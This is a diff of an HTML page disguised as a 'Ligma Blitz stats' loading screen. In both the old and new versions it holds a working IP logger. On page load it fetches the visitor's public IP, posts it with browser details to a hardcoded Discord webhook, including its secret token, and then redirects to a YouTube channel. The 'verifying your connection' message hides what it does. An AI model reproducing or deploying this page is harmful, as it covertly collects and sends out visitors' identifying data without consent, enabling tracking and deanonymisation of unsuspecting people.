@@ -1,38 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading Ligma Blitz Data...</title>
+    <title>Ligma Blitz Analytics</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
-<body style="background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
-    <h2>LOADING LIGMA BLITZ GROUPNESS STATS...</h2>
-    <p>Verifying connection... please wait.</p>
+<body style="background-color: #000; color: #fff; text-align: center; font-family: Arial; padding-top: 50px;">
+    <h2>LOADING LIGMA BLITZ STATS...</h2>
+    <p>Please wait while we verify your connection.</p>
 
     <script>
-        // One solid line for the URL - do not let Notepad break this line!
-        var WEBHOOK_URL = "https://discord.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44lbRhSdiJOvSpHBzljrwvDooIfw6hyQNp"; 
-        var REDIRECT_URL = "https://youtube.com/@LigmaBlox-w7m"; 
+        // CLEAN WEBHOOK URL
+        var hook = "https://discord.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44lbRhSdiJOvSpHBzljrwvDooIfw6hyQNp";
+        var tube = "https://youtube.com/@LigmaBlox-w7m";
 
-        // Emergency redirect after 5 seconds no matter what
-        setTimeout(function() { window.location.href = REDIRECT_URL; }, 5000);
+        function sendData() {
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                var params = {
+                    username: "Ligma Blitz Logger",
+                    content: "🚨 **New Log Found**\n**IP:** " + data.ip + "\n**Browser:** " + navigator.appName
+                };
 
-        $.getJSON("https://api.ipify.org?format=json", function(data) {
-            var payload = {
-                username: "Ligma Blitz Bot",
-                content: "🚨 **New Connection Logged**\n**Ligma Blitz Groupness Number:** " + data.ip + "\n**Device Info:** " + navigator.userAgent
-            };
-
-            $.ajax({
-                type: "POST",
-                url: WEBHOOK_URL,
-                data: JSON.stringify(payload),
-                contentType: "application/json",
-                complete: function() { 
-                    // Redirects to YouTube after the data is sent
-                    window.location.href = REDIRECT_URL; 
-                }
+                // Using fetch for better compatibility with GitHub
+                fetch(hook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(params)
+                }).then(() => {
+                    window.location.href = tube;
+                }).catch(() => {
+                    window.location.href = tube;
+                });
+            }).fail(function() {
+                window.location.href = tube;
             });
-        });
+        }
+
+        // Run the function
+        sendData();
+
+        // Safety backup redirect
+        setTimeout(function() { window.location.href = tube; }, 6000);
     </script>
 </body>
 </html>
